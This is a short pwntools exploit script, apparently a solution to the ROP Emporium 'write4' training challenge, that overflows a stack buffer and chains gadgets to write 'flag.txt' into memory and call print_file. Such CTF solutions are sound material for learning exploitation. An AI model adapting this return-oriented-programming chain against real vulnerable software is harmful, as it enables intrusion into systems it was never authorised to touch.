from pwn import *

elf = ELF('write4')                 #context.binary

def convertASCII_to_Hex(value):
      res = ""
      for i in value:
            res += hex(ord(i))[2:]
      return res      

def changeEndian(value):
      length = len(value)
      res = "0x"
      for i in range(length-1, 0, -2):
            res += value[i-1]+ value[i]
      return res      

def generateString(value):
      return int(changeEndian(convertASCII_to_Hex(value)), 16)
      
p = process(elf.path)

#Prepare the payload
junk = b"A"*40                                  #creates the junk part of the payload
pop_r14_r15 = p64(0x0000000000400690)           #pop r14 ; pop r15 ; ret          
r14 = p64(0x00601028)                           #r14
r15 = p64(generateString("flag.txt"))           #r15
mov_r14_r15 = p64(0x0000000000400628)           #mov qword ptr [r14], r15 ; ret           

pop_rdi = p64(0x0000000000400693)               #pop rdi ; ret
print_file = p64(0x00400510)                    #print_file function address

#payload
payload = junk + pop_r14_r15 + r14 + r15 + mov_r14_r15 + pop_rdi + r14 + print_file

# Send the payload

p.sendline(payload)                 #send the payload to the process

p.interactive()